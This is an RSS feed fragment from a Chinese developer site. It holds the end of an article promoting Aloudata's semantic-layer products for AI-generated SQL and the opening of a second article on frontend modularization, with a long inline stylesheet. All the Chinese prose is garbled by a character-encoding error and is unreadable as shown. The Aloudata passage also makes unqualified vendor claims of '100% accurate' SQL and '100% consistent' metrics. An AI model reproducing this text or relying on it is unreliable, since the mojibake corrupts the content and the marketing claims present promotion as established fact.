<p>AI Agent éœ€è¦æ— æ­§ä¹‰çš„ä¸Šä¸‹æ–‡æ¥å‡†ç¡®ç”Ÿæˆ SQLã€‚è¯­ä¹‰å±‚æä¾›äº†è¿™ä»½â€œä¸šåŠ¡è¯å…¸â€ï¼Œä¸º AI æä¾›äº†ç¨³å®šã€å¯é çš„æ•°æ®æ¥å£ï¼Œä»æ ¹æœ¬ä¸Šé¿å…äº†å› å£å¾„æ··ä¹±å¯¼è‡´çš„â€œAI å¹»è§‰â€ã€‚</p>
<h2 data-id="heading-3">Aloudata å¦‚ä½•åŸºäºè¯­ä¹‰å±‚èµ‹èƒ½ AI é©±åŠ¨çš„åˆ†æï¼Ÿ</h2>
<p>ä½œä¸ºå›½å†…æ•°æ®è¯­ä¹‰ç¼–ç»‡ï¼ˆSemantic Fabricï¼‰é¢†å¯¼è€…ï¼ŒAloudata æ–¹æ¡ˆçš„æ ¸å¿ƒæ˜¯ï¼šç”¨Â Aloudata CAN è‡ªåŠ¨åŒ–æŒ‡æ ‡å¹³å°æ„å»ºè¯­ä¹‰å±‚ï¼Œç”¨Â Aloudata Agent åˆ†æå†³ç­–æ™ºèƒ½ä½“ä½œä¸ºäº¤äº’å…¥å£ã€‚</p>
<p>ä¼ä¸šå¯ä»¥é€šè¿‡ Aloudata CAN ä¸­è¿æ¥æ•°ä»“æ˜ç»†å±‚ï¼Œåœ¨å¯è§†åŒ–ç•Œé¢é€šè¿‡é…ç½®åŒ–çš„æ–¹å¼å®šä¹‰ä¸šåŠ¡å®ä½“ã€ç»´åº¦å’ŒæŒ‡æ ‡ï¼Œæ„å»ºè¯­ä¹‰æ¨¡å‹ï¼Œå½¢æˆ NoETL æ•°æ®è¯­ä¹‰å±‚ï¼Œå®ç°ä¸šåŠ¡è¯­ä¹‰çš„æ ‡å‡†åŒ–å¼€å‘å’Œç®¡ç†ï¼Œä¿éšœ 100% æŒ‡æ ‡å£å¾„çš„ä¸€è‡´æ€§ï¼Œé¿å… AI é—®æ•°çš„â€œå¹»è§‰â€å‡ºç°ã€‚</p>
<p>ä»¥ NoETL æ•°æ®è¯­ä¹‰å±‚ä¸ºåº•åº§ï¼Œç”¨æˆ·å¯ä»¥éƒ¨ç½² Aloudata Agentï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€äº¤äº’çš„æ–¹å¼ç›´æ¥æé—®ï¼šâ€œä¸Šå‘¨æ–°ç”¨æˆ·é¦–å•å¹³å‡å®¢å•ä»·ï¼Ÿâ€Agent åŸºäºè¯­ä¹‰å±‚ç†è§£æ„å›¾ï¼Œé€šè¿‡ NL2MQL2SQL çš„æŠ€æœ¯è·¯å¾„ï¼Œå…ˆè¾“å‡º MQLï¼Œå†é€šè¿‡æŒ‡æ ‡è¯­ä¹‰å¼•æ“ç”Ÿæˆ 100% å‡†ç¡®çš„ SQL è¯­å¥å¹¶è¿”å›ç»“æœã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·é›¶ç­‰å¾…æŒ‡æ ‡äº¤ä»˜ï¼Œé€»è¾‘å˜æ›´åˆ†é’Ÿçº§ç”Ÿæ•ˆï¼Œæ— éœ€ ETLï¼›100%ä¸€è‡´å£å¾„ï¼Œæ‰€æœ‰äººä¸ AI é€šè¿‡åŒä¸€è¯­ä¹‰å±‚è®¿é—®æ•°æ®ï¼›æ— ç¼å¯¹æ¥ AIï¼Œè¯­ä¹‰å±‚ä¸º AI æä¾›æ ‡å‡†åŒ–æŸ¥è¯¢ APIã€‚</p>
<h2 data-id="heading-4">å¸¸è§ç–‘é—®å›ç­”ï¼ˆFAQï¼‰</h2>
<h4 data-id="heading-5">Q: è¯­ä¹‰å±‚æ¶æ„çš„æ€§èƒ½æ˜¯å¦æ¯”å®½è¡¨å·®ï¼Ÿ</h4>
<p>ä¸ä¼šã€‚è¯­ä¹‰å±‚é‡‡ç”¨æ™ºèƒ½æŸ¥è¯¢ä¸‹æ¨ä¸ç¼“å­˜ï¼Œå…¶ä¼˜åŠ¿åœ¨äºåœ¨ä¿è¯æ ¸å¿ƒæ€§èƒ½çš„åŒæ—¶ï¼Œæå¤§æ‰©å±•äº†å¯å³æ—¶å“åº”çš„é—®é¢˜èŒƒå›´ã€‚</p>
<h4 data-id="heading-6">Q: å·²å»ºçš„å®½è¡¨å’Œæ•°æ®ä»“åº“ï¼Œæ˜¯å¦è¦æ¨å€’é‡æ¥ï¼Ÿ</h4>
<p>ä¸éœ€è¦ã€‚è¯­ä¹‰å±‚æ˜¯å¢å¼ºå±‚ã€‚Aloudata CAN å¯ç›´æ¥è¿æ¥ç°æœ‰æ•°æ®èµ„äº§ï¼Œåœ¨å…¶ä¹‹ä¸Šæ„å»ºç»Ÿä¸€è¯­ä¹‰ï¼Œä¿æŠ¤æŠ•èµ„çš„åŒæ—¶è§£é”æ–°èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-7">Q: è¯­ä¹‰å±‚å¦‚ä½•ä¿è¯æ•°æ®å®‰å…¨ä¸æƒé™æ§åˆ¶ï¼Ÿ</h4>
<p>ä¼ä¸šçº§äº§å“ï¼ˆå¦‚ Aloudata CANï¼‰æä¾›è¡Œåˆ—çº§æƒé™ç®¡æ§ï¼Œå¹¶å°†è§„åˆ™ä¸è¯­ä¹‰æ¨¡å‹ç»‘å®šã€‚ä»»ä½•æŸ¥è¯¢éƒ½ä¼šè‡ªåŠ¨æ³¨å…¥æƒé™è¿‡æ»¤ï¼Œç¡®ä¿å®‰å…¨åˆè§„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´]]></title>    <link>https://juejin.cn/post/7597623395907846190</link>    <guid>https://juejin.cn/post/7597623395907846190</guid>    <pubDate>2026-01-21T11:50:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623395907846190" data-draft-id="7597379486428659738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:50:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ—æ¨¡å—åŒ– [4 - 1]ï¼šæ€æƒ³-è¶…è¶Šæ–‡ä»¶æ‹†åˆ†çš„è¾¹ç•Œæ€ç»´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:50:27.000Z" title="Wed Jan 21 2026 11:50:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>å†™åœ¨å‰é¢</strong></p>
<p>å¾ˆå¤šå‰ç«¯å¼€å‘è€…å¯¹â€œæ¨¡å—åŒ–â€çš„ç†è§£ï¼Œé•¿æœŸåœç•™åœ¨â€œæ–‡ä»¶æ‹†åˆ†â€çš„ç‰©ç†å±‚é¢ã€‚</p>
<p>æ¯”å¦‚ï¼šä¸€ä¸ª Vue/React ç»„ä»¶å†™äº† 1000 è¡Œï¼Œè§‰å¾—å¤ªä¹±äº†ï¼Œäºæ˜¯æŠŠé‡Œé¢çš„ä¸‰ä¸ªå‡½æ•°æå–å‡ºæ¥ï¼Œæ‰”åˆ° <code>utils.js</code> é‡Œï¼›æŠŠ HTML é‡Œçš„å¼¹çª—æ‹†å‡ºæ¥ï¼Œæ‰”åˆ° <code>components/Modal.vue</code> é‡Œã€‚åšå®Œè¿™äº›ï¼Œçœ‹ç€åªæœ‰ 200 è¡Œçš„ä¸»æ–‡ä»¶ï¼Œå¿ƒé‡Œä¸€é˜µèˆ’çˆ½ï¼šâ€œå•Šï¼Œæˆ‘åšå¥½äº†æ¨¡å—åŒ–ã€‚â€</p>
<p><strong>è¿™æ˜¯é”™è§‰ã€‚</strong></p>
<p>å¦‚æœä½ åªæ˜¯æŠŠä¸€å›¢ä¹±éº»çš„ä»£ç åˆ‡æˆäº†äº”æ®µä¹±éº»ï¼Œé‚£è¿™ä¸å«æ¨¡å—åŒ–ï¼Œè¿™å« <strong>â€œåˆ†å¸ƒå¼å±å±±â€</strong> ã€‚</p>
<p>åœ¨æ¶æ„å¸ˆçš„çœ¼é‡Œï¼Œæ¨¡å—åŒ–ä¸æ˜¯ä¸ºäº†æŠŠæ–‡ä»¶å˜å°ï¼Œè€Œæ˜¯ä¸ºäº†<strong>æ²»ç†å¤æ‚æ€§</strong>ã€‚å®ƒæ˜¯å…³äº<strong>è¾¹ç•Œï¼ˆBoundariesï¼‰</strong> ã€<strong>å†…èšï¼ˆCohesionï¼‰</strong> å’Œ <strong>è€¦åˆï¼ˆCouplingï¼‰</strong> çš„è‰ºæœ¯ã€‚æœ¬ç¯‡æˆ‘ä»¬å°†æŠ›å¼€å…·ä½“çš„è¯­æ³•ï¼Œæ¢è®¨å¦‚ä½•å»ºç«‹æ¶æ„çº§åˆ«çš„æ¨¡å—åŒ–æ€ç»´ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f78d964b574e4d9bba60d915a937165b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769601027&amp;x-signature=uOlTWK4ZDG84tfzE7MWdoeUM4eY%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ ä»€ä¹ˆæ˜¯æ¨¡å—ï¼Ÿä»â€œç‰©ç†æ–‡ä»¶â€åˆ°â€œé€»è¾‘å•å…ƒâ€</h2>
<p>åˆçº§å·¥ç¨‹å¸ˆçœ‹æ¨¡å—ï¼Œçœ‹åˆ°çš„æ˜¯æ–‡ä»¶åç¼€ï¼ˆ<code>.js</code>, <code>.vue</code>, <code>.tsx</code>ï¼‰ï¼›æ¶æ„å¸ˆçœ‹æ¨¡å—ï¼Œçœ‹åˆ°çš„æ˜¯<strong>èŒè´£çš„è¾¹ç•Œ</strong>ã€‚</p>
<h3 data-id="heading-1">1.1 æ¨¡å—åŒ–çš„ä¸‰ä¸ªå±‚çº§</h3>
<p>æˆ‘ä»¬çš„è®¤çŸ¥é€šå¸¸ç»å†äº†ä¸‰ä¸ªé˜¶æ®µçš„è¿›åŒ–ï¼š</p>
<ol>
<li><strong>è¯­æ³•çº§æ¨¡å—åŒ– (Syntax Level)ï¼š</strong> è¿™æ˜¯æœ€åŸºç¡€çš„ã€‚AMDã€CommonJSã€ES Modulesã€‚è§£å†³çš„æ˜¯<strong>å‘½åç©ºé—´æ±¡æŸ“</strong>å’Œ<strong>è„šæœ¬åŠ è½½é¡ºåº</strong>çš„é—®é¢˜ã€‚è¿™æ˜¯ 2015 å¹´å‰æˆ‘ä»¬è¦è§£å†³çš„ä¸»è¦çŸ›ç›¾ï¼Œç°åœ¨å·²ç»å˜æˆäº†åƒç©ºæ°”ä¸€æ ·çš„åŸºç¡€è®¾æ–½ã€‚</li>
<li><strong>æ–‡ä»¶çº§æ¨¡å—åŒ– (File Level)ï¼š</strong> ä¸ºäº†ä»£ç å¤ç”¨ï¼Œæˆ‘ä»¬å°†é€šç”¨é€»è¾‘æå–ä¸º <code>hooks</code>ï¼Œå°† UI æå–ä¸º <code>components</code>ã€‚è¿™æ˜¯ç›®å‰ç»å¤§å¤šæ•°ä¸­çº§å·¥ç¨‹å¸ˆæ‰€å¤„çš„é˜¶æ®µã€‚ä½†å¦‚æœä¸å°å¿ƒï¼Œå¾ˆå®¹æ˜“é™·å…¥ <strong>â€œä¸ºäº†æ‹†åˆ†è€Œæ‹†åˆ†â€</strong> çš„é™·é˜±ã€‚</li>
<li><strong>é¢†åŸŸçº§æ¨¡å—åŒ– (Domain Level)ï¼š</strong> è¿™æ˜¯æ¶æ„å¸ˆå…³æ³¨çš„å±‚é¢ã€‚ä¸€ä¸ªæ¨¡å—ä¸å†æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>ä¸šåŠ¡èƒ½åŠ›çš„é›†åˆ</strong>ã€‚ æ¯”å¦‚â€œç”¨æˆ·æ¨¡å—â€ï¼Œå®ƒå¯èƒ½åŒ…å« <code>UserCard.tsx</code>ï¼ˆUIï¼‰ã€<code>useUser.ts</code>ï¼ˆé€»è¾‘ï¼‰ã€<code>user-service.ts</code>ï¼ˆAPIï¼‰ã€<code>UserType.ts</code>ï¼ˆç±»å‹ï¼‰ã€‚å®ƒä»¬åœ¨ç‰©ç†ä¸Šå¯èƒ½åˆ†æ•£ï¼Œä½†åœ¨é€»è¾‘ä¸Šæ˜¯ä¸€ä¸ªæ•´ä½“ã€‚<strong>åªæœ‰å½“è¿™ä¸ªæ•´ä½“å¯¹å¤–æš´éœ²æå…¶æœ‰é™çš„æ¥å£ï¼Œè€Œéšè—å†…éƒ¨æ‰€æœ‰å¤æ‚åº¦æ—¶ï¼Œå®ƒæ‰æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ¨¡å—ã€‚</strong></li>
</ol>
<h3 data-id="heading-2">1.2 æ¶æ„å¸ˆçš„è§†è§’ï¼šéšè—è€Œéæš´éœ²</h3>
<p>è½¯ä»¶å·¥ç¨‹å¤§å¸ˆ David Parnas æ—©åœ¨ 1972 å¹´å°±æå‡ºäº†ä¸€ä¸ªæŒ¯è‹å‘è©çš„è§‚ç‚¹ï¼š</p>
<blockquote>
<p><strong>â€œæ¨¡å—åŒ–çš„æ ¸å¿ƒåœ¨äºä½ éšè—äº†ä»€ä¹ˆï¼Œè€Œä¸æ˜¯ä½ æš´éœ²äº†ä»€ä¹ˆã€‚â€</strong></p>
</blockquote>
